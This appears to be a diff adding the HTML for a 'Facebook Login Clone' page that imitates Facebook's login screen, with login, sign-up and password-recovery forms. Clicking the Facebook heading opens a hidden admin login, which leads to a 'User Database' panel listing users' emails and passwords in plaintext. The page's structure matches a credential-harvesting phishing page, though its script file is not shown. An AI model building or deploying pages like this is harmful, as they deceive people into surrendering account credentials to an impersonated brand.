@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Facebook Login Clone</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="login-box" id="loginForm">
+      
+    <!-- <h1>facebook</h1> -->
+    
+ <h1 style="text-align:center;"><a href="#" onclick="showAdminLogin()">Facebook</a></h1>
+ 
+    <input type="text" id="loginEmail" placeholder="Email or phone number" />
+    <input type="password" id="loginPassword" placeholder="Password" />
+    <button onclick="login()">Log In</button>
+    <p><a href="#" onclick="showForgotForm()">Forgot password?</a></p>
+    <p><a href="#" onclick="showRegisterForm()">Create new account</a></p>
+    <!-- <p style="text-align:center;"><a href="#" onclick="showAdminLogin()">Admin login</a></p> -->
+  </div>
+  <div class="login-box hidden" id="registerForm">
+    <h2>Create Account</h2>
+    <input type="text" id="registerEmail" placeholder="Email" />
+    <input type="password" id="registerPassword" placeholder="Password" />
+    <button onclick="register()">Sign Up</button>
+    <p><a href="#" onclick="showLoginForm()">Back to login</a></p>
+  </div>
+  <div class="login-box hidden" id="forgotForm">
+    <h2>Recover Password</h2>
+    <input type="text" id="forgotEmail" placeholder="Enter your email" />
+    <button onclick="recoverPassword()">Recover</button>
+    <p><a href="#" onclick="showLoginForm()">Back to login</a></p>
+  </div>
+  
+  
+  <div class="login-box hidden" id="adminLoginForm">
+    <h2>Admin Access</h2>
+    <input type="text" id="adminEmail" placeholder="Admin Email" />
+    <input type="password" id="adminPassword" placeholder="Password" />
+    
+    <button onclick="adminLogin()">Login as Admin</button>
+    <p><a href="#" onclick="showLoginForm()">Back to login</a></p>
+  </div>
+  <div class="login-box hidden" id="adminPanel">
+    <h2>User Database</h2>
+    <table style="width: 100%; font-size: 14px;" border="1">
+      <thead>
+        <tr><th>Email</th><th>Password</th></tr>
+      </thead>
+      <tbody id="userTable"></tbody>
+    </table>
+    <button style="margin-top: 10px;" onclick="logoutAdmin()">Logout</button>
+  </div>
+  <script src="script.js"></script>
+</body>
+</html>
